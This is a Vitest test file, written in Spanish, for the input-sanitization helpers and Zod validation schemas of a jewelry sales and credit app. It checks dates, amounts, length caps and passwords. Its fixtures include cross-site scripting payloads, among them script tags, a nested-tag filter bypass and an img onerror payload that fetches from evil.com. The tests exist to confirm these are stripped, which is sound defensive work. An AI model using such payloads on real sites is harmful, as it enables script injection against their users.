import { describe, it, expect } from "vitest";
import {
  limpiarCaracteresControl,
  limpiarHtml,
  colapsarEspacios,
  normalizarEspaciosMultilinea,
  sanitizarCadena,
  sanitizarTextoLibre,
  esquemaFecha,
  esquemaMonto,
  esquemaMontoPositivo,
} from "@/lib/sanitizacion";
import { esquemaCliente } from "@/lib/schemas/cliente";
import { esquemaVenta, esquemaArticuloVenta } from "@/lib/schemas/venta";
import { esquemaPago, esquemaPagosLote, LOTE_MAXIMO } from "@/lib/schemas/pago";
import { esquemaDevolucion, esquemaArticuloDevolucion } from "@/lib/schemas/devolucion";
import { esquemaArticulo, esquemaAjusteStock } from "@/lib/schemas/articulo";
import { esquemaCatalogo } from "@/lib/schemas/catalogo";
import {
  esquemaUsuario,
  esquemaEditarUsuario,
  esquemaResetPassword,
  esquemaCambiarPasswordPropia,
} from "@/lib/schemas/usuario";

describe("Helpers de sanitización (sanitizacion.ts)", () => {
  describe("limpiarCaracteresControl", () => {
    it("elimina caracteres nulos y de control ASCII", () => {
      const sucio = "Hola\u0000\u0001\u0002Mundo\u0007\u001F!";
      expect(limpiarCaracteresControl(sucio)).toBe("HolaMundo!");
    });

    it("elimina el carácter DEL (0x7F) y controles C1 (0x80-0x9F)", () => {
      const sucio = "Texto\u007Fcon\u0080controles\u009FC1";
      expect(limpiarCaracteresControl(sucio)).toBe("TextoconcontrolesC1");
    });

    it("elimina caracteres invisibles y zero-width de Unicode", () => {
      const conInvisibles = "Token\u200Boculto\u200Ccon\u200Dmarcas\u200Ede\u200Forden\uFEFFBOM";
      expect(limpiarCaracteresControl(conInvisibles)).toBe("TokenocultoconmarcasdeordenBOM");
    });

    it("en modo monolínea (default) elimina saltos de línea y tabuladores", () => {
      const multiline = "Línea 1\nLínea 2\r\nLínea 3\tTab";
      expect(limpiarCaracteresControl(multiline, false)).toBe("Línea 1Línea 2Línea 3Tab");
    });

    it("en modo multilínea preserva saltos de línea y tabuladores", () => {
      const multiline = "Línea 1\u0000\nLínea 2\r\nLínea 3\tTab\u200B";
      expect(limpiarCaracteresControl(multiline, true)).toBe("Línea 1\nLínea 2\r\nLínea 3\tTab");
    });
  });

  describe("limpiarHtml", () => {
    it("elimina tags HTML simples", () => {
      expect(limpiarHtml("<b>Texto</b> en <i>cursiva</i>")).toBe("Texto en cursiva");
    });

    it("elimina bloques <script> completos con su contenido", () => {
      const xss = "Inicio <script>alert('xss');</script> Fin";
      expect(limpiarHtml(xss)).toBe("Inicio  Fin");
    });

    it("elimina bloques <style> completos con su contenido", () => {
      const xss = "Texto <style>body { display: none; }</style> visible";
      expect(limpiarHtml(xss)).toBe("Texto  visible");
    });

    it("elimina tags con atributos maliciosos (ej. img onerror)", () => {
      const xss = 'Joyas <img src="x" onerror="fetch(\'//evil.com\')"/> finas';
      expect(limpiarHtml(xss)).toBe("Joyas  finas");
    });

    it("desactiva ataques con tags anidados o recursivos", () => {
      const bypass = "<<script>script>alert(1)<</script>/script>";
      expect(limpiarHtml(bypass)).toBe("");
    });

    it("elimina comentarios HTML", () => {
      const conComentario = "Texto <!-- Secreto de cliente --> visible";
      expect(limpiarHtml(conComentario)).toBe("Texto  visible");
    });

    it("preserva operadores de comparación matemática legítimos", () => {
      expect(limpiarHtml("Medida 1 < 2 y peso 5 > 3")).toBe("Medida 1 < 2 y peso 5 > 3");
    });

    it("en modo multilínea convierte <br> y </p> a saltos de línea", () => {
      const texto = "Párrafo 1<br>Línea 2<br/>Línea 3<p>Párrafo 2</p>";
      expect(limpiarHtml(texto, true)).toBe("Párrafo 1\nLínea 2\nLínea 3Párrafo 2\n");
    });
  });

  describe("colapsarEspacios", () => {
    it("hace trim de espacios iniciales y finales", () => {
      expect(colapsarEspacios("   hola   ")).toBe("hola");
    });

    it("colapsa múltiples espacios, tabuladores y saltos intermedios a un espacio", () => {
      expect(colapsarEspacios("Ana    María\t\tPérez\n\nGómez")).toBe("Ana María Pérez Gómez");
    });
  });

  describe("normalizarEspaciosMultilinea", () => {
    it("unifica saltos \\r\\n a \\n y colapsa saltos triples o mayores a doble salto", () => {
      const entrada = "Párrafo 1\r\n\r\n\r\n\r\nPárrafo 2\r\n\r\nPárrafo 3";
      expect(normalizarEspaciosMultilinea(entrada)).toBe("Párrafo 1\n\nPárrafo 2\n\nPárrafo 3");
    });

    it("colapsa espacios horizontales continuos en la misma línea", () => {
      const entrada = "Línea 1    con    muchos   espacios\nLínea   2";
      expect(normalizarEspaciosMultilinea(entrada)).toBe("Línea 1 con muchos espacios\nLínea 2");
    });
  });

  describe("sanitizarCadena (monolínea)", () => {
    it("aplica la suite completa: control, html, espacios y trim", () => {
      const payload = "   <b>Oro</b> 14k \u0000 <script>alert(1)</script>   con   diamante \uFEFF  ";
      expect(sanitizarCadena(payload)).toBe("Oro 14k con diamante");
    });
  });

  describe("sanitizarTextoLibre (multilínea)", () => {
    it("sanitiza respetando párrafos legítimos", () => {
      const payload =
        "   Línea 1   <script>steal()</script>   \u0000\n\n\n\nLínea 2 con <br>salto   y \u200Bcontrol.   ";
      const esperado = "Línea 1\n\nLínea 2 con\nsalto y control.";
      expect(sanitizarTextoLibre(payload)).toBe(esperado);
    });
  });
});

describe("Esquemas de validación comunes (fecha y dinero)", () => {
  describe("esquemaFecha (Regla 2)", () => {
    it("acepta fechas válidas en formato YYYY-MM-DD", () => {
      expect(esquemaFecha.safeParse("2026-08-10").success).toBe(true);
      expect(esquemaFecha.safeParse("2024-02-29").success).toBe(true); // año bisiesto
    });

    it("rechaza formatos de fecha no conformes", () => {
      expect(esquemaFecha.safeParse("10/08/2026").success).toBe(false);
      expect(esquemaFecha.safeParse("2026-8-10").success).toBe(false);
      expect(esquemaFecha.safeParse("2026-08-1").success).toBe(false);
      expect(esquemaFecha.safeParse("2026/08/10").success).toBe(false);
      expect(esquemaFecha.safeParse("2026-08-10T00:00:00Z").success).toBe(false);
      expect(esquemaFecha.safeParse("").success).toBe(false);
      expect(esquemaFecha.safeParse("cadena-aleatoria").success).toBe(false);
    });

    it("rechaza fechas que no existen en el calendario gregoriano", () => {
      expect(esquemaFecha.safeParse("2026-02-29").success).toBe(false); // 2026 no es bisiesto
      expect(esquemaFecha.safeParse("2026-04-31").success).toBe(false); // abril solo tiene 30 días
      expect(esquemaFecha.safeParse("2026-02-30").success).toBe(false);
      expect(esquemaFecha.safeParse("2026-13-01").success).toBe(false); // mes 13 no existe
      expect(esquemaFecha.safeParse("2026-00-10").success).toBe(false); // mes 0 no existe
      expect(esquemaFecha.safeParse("2026-11-32").success).toBe(false); // día 32 no existe
    });
  });

  describe("esquemaMonto y esquemaMontoPositivo (Regla 1)", () => {
    it("esquemaMonto acepta montos con 0 o hasta 2 decimales", () => {
      expect(esquemaMonto.safeParse("0").success).toBe(true);
      expect(esquemaMonto.safeParse("0.00").success).toBe(true);
      expect(esquemaMonto.safeParse("150").success).toBe(true);
      expect(esquemaMonto.safeParse("150.5").success).toBe(true);
      expect(esquemaMonto.safeParse("150.50").success).toBe(true);
      expect(esquemaMonto.safeParse("999999999.99").success).toBe(true);
    });

    it("esquemaMonto rechaza valores con letras, negativos o exceso de decimales", () => {
      expect(esquemaMonto.safeParse("abc").success).toBe(false);
      expect(esquemaMonto.safeParse("-50.00").success).toBe(false);
      expect(esquemaMonto.safeParse("50.123").success).toBe(false);
      expect(esquemaMonto.safeParse("1,500.00").success).toBe(false);
      expect(esquemaMonto.safeParse("1000000000.00").success).toBe(false); // > 9 enteros
      expect(esquemaMonto.safeParse("").success).toBe(false);
    });

    it("esquemaMontoPositivo rechaza 0 y valores negativos", () => {
      expect(esquemaMontoPositivo.safeParse("0").success).toBe(false);
      expect(esquemaMontoPositivo.safeParse("0.00").success).toBe(false);
      expect(esquemaMontoPositivo.safeParse("-10.00").success).toBe(false);
      expect(esquemaMontoPositivo.safeParse("0.01").success).toBe(true);
      expect(esquemaMontoPositivo.safeParse("1500.00").success).toBe(true);
    });
  });
});

describe("Esquema Cliente (cliente.ts)", () => {
  const clienteBase = {
    nombre: "Roberto Gómez",
  };

  it("sanitiza el nombre eliminando caracteres de control, HTML y espacios repetidos", () => {
    const res = esquemaCliente.safeParse({
      nombre: "   Roberto \u0000 <script>alert('xss')</script> Gómez   ",
    });
    expect(res.success).toBe(true);
    if (res.success) {
      expect(res.data.nombre).toBe("Roberto Gómez");
    }
  });

  it("rechaza si el nombre supera el límite máximo de 150 caracteres", () => {
    const nombreLargo = "A".repeat(151);
    expect(esquemaCliente.safeParse({ nombre: nombreLargo }).success).toBe(false);
  });

  it("rechaza si tras la sanitización el nombre queda vacío", () => {
    expect(esquemaCliente.safeParse({ nombre: "   \u0000   " }).success).toBe(false);
    expect(esquemaCliente.safeParse({ nombre: "   <script></script>   " }).success).toBe(false);
  });

  it("sanitiza campos opcionales y convierte cadenas vacías a undefined", () => {
    const res = esquemaCliente.safeParse({
      ...clienteBase,
      telefono: "  55-1234-5678 \u0000 ",
      empresa: "   ",
      calle: "<p>Av. Reforma 123</p>",
      numExt: null,
    });
    expect(res.success).toBe(true);
    if (res.success) {
      expect(res.data.telefono).toBe("55-1234-5678");
      expect(res.data.empresa).toBeUndefined();
      expect(res.data.calle).toBe("Av. Reforma 123");
      expect(res.data.numExt).toBeUndefined();
    }
  });

  it("rechaza campos opcionales que superan su límite de longitud", () => {
    expect(
      esquemaCliente.safeParse({
        ...clienteBase,
        telefono: "123456789012345678901", // 21 chars, max 20
      }).success
    ).toBe(false);

    expect(
      esquemaCliente.safeParse({
        ...clienteBase,
        cp: "12345678901", // 11 chars, max 10
      }).success
    ).toBe(false);
  });

  it("valida y sanitiza el email", () => {
    const resValido = esquemaCliente.safeParse({
      ...clienteBase,
      email: "  contacto@ejemplo.com  ",
    });
    expect(resValido.success).toBe(true);
    if (resValido.success) {
      expect(resValido.data.email).toBe("contacto@ejemplo.com");
    }

    const resVacio = esquemaCliente.safeParse({
      ...clienteBase,
      email: "   ",
    });
    expect(resVacio.success).toBe(true);
    if (resVacio.success) {
      expect(resVacio.data.email).toBeUndefined();
    }

    expect(esquemaCliente.safeParse({ ...clienteBase, email: "invalido-sin-arroba" }).success).toBe(
      false
    );
    expect(esquemaCliente.safeParse({ ...clienteBase, email: "A".repeat(151) }).success).toBe(false);
  });
});

describe("Esquemas de Venta (venta.ts)", () => {
  const articuloValido = {
    idCatalogo: null,
    nombre: "Anillo de Oro 14k",
    cantidad: 1,
    precioUnitario: "1500.00",
  };

  it("sanitiza el nombre del artículo en la venta", () => {
    const res = esquemaArticuloVenta.safeParse({
      ...articuloValido,
      nombre: "   Anillo   \u0000<b>Oro</b> 14k   ",
    });
    expect(res.success).toBe(true);
    if (res.success) {
      expect(res.data.nombre).toBe("Anillo Oro 14k");
    }
  });

  it("rechaza artículo con nombre que supera 200 caracteres", () => {
    expect(
      esquemaArticuloVenta.safeParse({
        ...articuloValido,
        nombre: "Joyas ".repeat(40), // > 200 chars
      }).success
    ).toBe(false);
  });

  it("rechaza artículo con cantidad <= 0 o excesiva (>999999)", () => {
    expect(esquemaArticuloVenta.safeParse({ ...articuloValido, cantidad: 0 }).success).toBe(false);
    expect(esquemaArticuloVenta.safeParse({ ...articuloValido, cantidad: -1 }).success).toBe(false);
    expect(esquemaArticuloVenta.safeParse({ ...articuloValido, cantidad: 1000000 }).success).toBe(
      false
    );
  });

  it("valida la fecha de venta con estrictez de calendario", () => {
    const venta = {
      idCliente: 1,
      fecha: "2026-02-30", // Fecha inexistente
      esquemaPago: "Contado" as const,
      tieneEnganche: false,
      articulos: [articuloValido],
    };
    expect(esquemaVenta.safeParse(venta).success).toBe(false);

    expect(
      esquemaVenta.safeParse({
        ...venta,
        fecha: "2026-08-10",
      }).success
    ).toBe(true);
  });

  it("rechaza ventas con más de 100 artículos para evitar DoS por payload masivo", () => {
    const articulosMasivos = Array.from({ length: 101 }, () => articuloValido);
    expect(
      esquemaVenta.safeParse({
        idCliente: 1,
        fecha: "2026-08-10",
        esquemaPago: "Contado",
        tieneEnganche: false,
        articulos: articulosMasivos,
      }).success
    ).toBe(false);
  });
});

describe("Esquemas de Pago (pago.ts)", () => {
  const pagoBase = {
    idCliente: 5,
    fecha: "2026-08-10",
    monto: "500.00",
  };

  it("sanitiza referencia y notas de pago", () => {
    const res = esquemaPago.safeParse({
      ...pagoBase,
      referencia: "   Ref: #12345 \u0000 <script>alert(1)</script>   ",
      notas: "Nota 1 <br> Nota 2 con \u0000 caracteres de control",
    });
    expect(res.success).toBe(true);
    if (res.success) {
      expect(res.data.referencia).toBe("Ref: #12345");
      expect(res.data.notas).toBe("Nota 1\nNota 2 con caracteres de control");
    }
  });

  it("rechaza montos de pago negativos o en cero (Regla 1)", () => {
    expect(esquemaPago.safeParse({ ...pagoBase, monto: "0" }).success).toBe(false);
    expect(esquemaPago.safeParse({ ...pagoBase, monto: "0.00" }).success).toBe(false);
    expect(esquemaPago.safeParse({ ...pagoBase, monto: "-100.00" }).success).toBe(false);
    expect(esquemaPago.safeParse({ ...pagoBase, monto: "abc" }).success).toBe(false);
  });

  it("rechaza pagos con fecha inexistente en el calendario", () => {
    expect(esquemaPago.safeParse({ ...pagoBase, fecha: "2026-11-31" }).success).toBe(false);
  });

  it("rechaza notas que exceden 2000 caracteres", () => {
    const notasLargas = "N".repeat(2001);
    expect(esquemaPago.safeParse({ ...pagoBase, notas: notasLargas }).success).toBe(false);
  });

  it("limita los pagos en lote al máximo permitido (LOTE_MAXIMO = 50)", () => {
    const loteValido = Array.from({ length: LOTE_MAXIMO }, () => pagoBase);
    expect(esquemaPagosLote.safeParse(loteValido).success).toBe(true);

    const loteExcedido = Array.from({ length: LOTE_MAXIMO + 1 }, () => pagoBase);
    expect(esquemaPagosLote.safeParse(loteExcedido).success).toBe(false);
  });
});

describe("Esquemas de Devolución (devolucion.ts)", () => {
  const articuloDevolucion = {
    idCatalogo: null,
    nombre: "Cadena de Plata",
    cantidad: 1,
    precioUnitario: "300.00",
  };

  it("sanitiza el motivo de devolución respetando multilínea", () => {
    const res = esquemaDevolucion.safeParse({
      idCliente: 10,
      fecha: "2026-08-10",
      motivo: "Pieza rota <script>malicioso()</script>\nCliente pide abono a cuenta",
      articulos: [articuloDevolucion],
    });
    expect(res.success).toBe(true);
    if (res.success) {
      expect(res.data.motivo).toBe("Pieza rota\nCliente pide abono a cuenta");
    }
  });

  it("sanitiza el nombre del artículo en devolución y valida montos", () => {
    const res = esquemaArticuloDevolucion.safeParse({
      ...articuloDevolucion,
      nombre: "   Cadena \u0000 <b>Plata</b>   ",
      precioCredito: "250.00",
    });
    expect(res.success).toBe(true);
    if (res.success) {
      expect(res.data.nombre).toBe("Cadena Plata");
      expect(res.data.precioCredito).toBe("250.00");
    }
  });

  it("rechaza devolución con fecha no válida o artículos vacíos", () => {
    expect(
      esquemaDevolucion.safeParse({
        idCliente: 10,
        fecha: "2026-02-30",
        articulos: [articuloDevolucion],
      }).success
    ).toBe(false);

    expect(
      esquemaDevolucion.safeParse({
        idCliente: 10,
        fecha: "2026-08-10",
        articulos: [],
      }).success
    ).toBe(false);
  });
});

describe("Esquema Catálogo / Artículo (articulo.ts y catalogo.ts)", () => {
  it("sanitiza el nombre y descripción del artículo", () => {
    const res = esquemaArticulo.safeParse({
      nombre: "   Pulsera \u0000 <b>Zafiro</b>   ",
      precio: "2500.00",
      descripcion: "Hermosa pulsera.<br>Acabado fino. <script>alert(1)</script>",
      activo: true,
      stockMinimo: 2,
    });
    expect(res.success).toBe(true);
    if (res.success) {
      expect(res.data.nombre).toBe("Pulsera Zafiro");
      expect(res.data.descripcion).toBe("Hermosa pulsera.\nAcabado fino.");
    }
  });

  it("rechaza precios con formato no monetario o negativos", () => {
    expect(
      esquemaArticulo.safeParse({
        nombre: "Anillo",
        precio: "-150.00",
        activo: true,
        stockMinimo: 0,
      }).success
    ).toBe(false);

    expect(
      esquemaArticulo.safeParse({
        nombre: "Anillo",
        precio: "mil pesos",
        activo: true,
        stockMinimo: 0,
      }).success
    ).toBe(false);
  });

  it("esquemaCatalogo es un alias idéntico a esquemaArticulo", () => {
    const datos = {
      nombre: "Dije",
      precio: "450.00",
      activo: true,
      stockMinimo: 1,
    };
    expect(esquemaCatalogo.safeParse(datos).success).toBe(true);
  });

  it("esquemaAjusteStock rechaza delta de 0 o delta fuera de rango", () => {
    expect(esquemaAjusteStock.safeParse({ idCatalogo: 1, delta: 0 }).success).toBe(false);
    expect(esquemaAjusteStock.safeParse({ idCatalogo: 1, delta: 1000000 }).success).toBe(false);
    expect(esquemaAjusteStock.safeParse({ idCatalogo: 1, delta: 5 }).success).toBe(true);
    expect(esquemaAjusteStock.safeParse({ idCatalogo: 1, delta: -3 }).success).toBe(true);
  });
});

describe("Esquemas de Usuario (usuario.ts)", () => {
  it("valida username restringido a minúsculas, números y caracteres seguros", () => {
    expect(
      esquemaUsuario.safeParse({
        username: "admin_123",
        nombreCompleto: "Administrador",
        rol: "admin",
        password: "passwordSegura123",
      }).success
    ).toBe(true);

    // Mayúsculas no permitidas (se aplica toLowerCase pero valida el regex)
    expect(
      esquemaUsuario.safeParse({
        username: "user@domain.com", // caracteres no permitidos en username
        nombreCompleto: "Usuario",
        rol: "operador",
        password: "passwordSegura123",
      }).success
    ).toBe(false);

    // Inyección o caracteres de control
    expect(
      esquemaUsuario.safeParse({
        username: "admin<script>",
        nombreCompleto: "Usuario",
        rol: "operador",
        password: "passwordSegura123",
      }).success
    ).toBe(false);
  });

  it("sanitiza el nombre completo del usuario", () => {
    const res = esquemaUsuario.safeParse({
      username: "cajero",
      nombreCompleto: "   Juan \u0000 <p>Pérez</p>   ",
      rol: "consulta",
      password: "passwordSegura123",
    });
    expect(res.success).toBe(true);
    if (res.success) {
      expect(res.data.nombreCompleto).toBe("Juan Pérez");
    }
  });

  it("rechaza contraseñas menores a 8 caracteres o mayores a 128 (prevención DoS bcrypt)", () => {
    const usuarioBase = {
      username: "cobrador",
      nombreCompleto: "Cobrador 1",
      rol: "operador" as const,
    };

    expect(esquemaUsuario.safeParse({ ...usuarioBase, password: "123" }).success).toBe(false);
    expect(
      esquemaUsuario.safeParse({ ...usuarioBase, password: "P".repeat(128) + "1" }).success
    ).toBe(false);
    expect(
      esquemaUsuario.safeParse({ ...usuarioBase, password: "P".repeat(127) + "1" }).success
    ).toBe(true);
  });

  it("esquemaEditarUsuario sanitiza nombreCompleto y valida rol/activo", () => {
    const res = esquemaEditarUsuario.safeParse({
      nombreCompleto: "   Admin \u0000 <b>Principal</b>   ",
      rol: "admin",
      activo: true,
      email: "  admin@ejemplo.com  ",
    });
    expect(res.success).toBe(true);
    if (res.success) {
      expect(res.data.nombreCompleto).toBe("Admin Principal");
      expect(res.data.email).toBe("admin@ejemplo.com");
    }
  });

  it("esquemaResetPassword exige coincidencia y tope de longitud", () => {
    expect(
      esquemaResetPassword.safeParse({
        password: "nuevaPassword123",
        confirmar: "distintaPassword123",
      }).success
    ).toBe(false);

    expect(
      esquemaResetPassword.safeParse({
        password: "nuevaPassword123",
        confirmar: "nuevaPassword123",
      }).success
    ).toBe(true);
  });

  it("esquemaCambiarPasswordPropia valida contraseña actual y coincidencia", () => {
    expect(
      esquemaCambiarPasswordPropia.safeParse({
        passwordActual: "anterior123",
        passwordNueva: "nuevaSuperPassword123",
        confirmar: "nuevaSuperPassword123",
      }).success
    ).toBe(true);

    expect(
      esquemaCambiarPasswordPropia.safeParse({
        passwordActual: "",
        passwordNueva: "nuevaSuperPassword123",
        confirmar: "nuevaSuperPassword123",
      }).success
    ).toBe(false);
  });
});
